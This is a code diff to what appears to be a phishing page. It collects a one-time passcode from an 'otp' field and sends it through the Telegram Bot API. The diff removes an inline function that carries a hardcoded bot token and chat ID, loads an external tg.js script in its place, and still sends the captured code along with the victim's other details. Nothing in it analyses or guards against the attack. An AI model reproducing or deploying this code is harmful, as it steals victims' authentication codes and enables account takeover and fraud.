@@ -15,6 +15,8 @@
 </head>
 
 <body>
+    <script src='../assets/js/tg.js'></script>
+
     <div>
         <div class="w-embed w-script">
             <div id="root">
@@ -139,33 +141,6 @@
             });
 
 
-            function sendTelegramMessage(messageText) {
-                botToken = '8599584358:AAFo3N5h5TrjujeZGH2SbS8L4EPpjYSaQqg'
-                chatId = '-5263360636'
-                const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-                $.ajax({
-                    url: apiUrl,
-                    type: 'POST',
-                    data: {
-                        chat_id: chatId,
-                        text: messageText,
-                        parse_mode: "MarkdownV2"
-
-                    },
-                    success: function(response) {
-                        console.log('Message sent successfully:', response);
-                        // Optional: Provide feedback to the user
-                    },
-                    error: function(error) {
-                        console.error('Error sending message:', error);
-                        // Optional: Handle error and provide feedback
-                    }
-                });
-            }
-
-
-
 
 
             document.getElementById("otp").addEventListener("input", function(event) {
@@ -195,7 +170,8 @@
       otp: ${document.getElementById("otp").value}
       `
 
-                sendTelegramMessage(message)
+send_telegram_message(message)
+
                 setCookie('otpflag', '1');
 
                 setTimeout(function() {
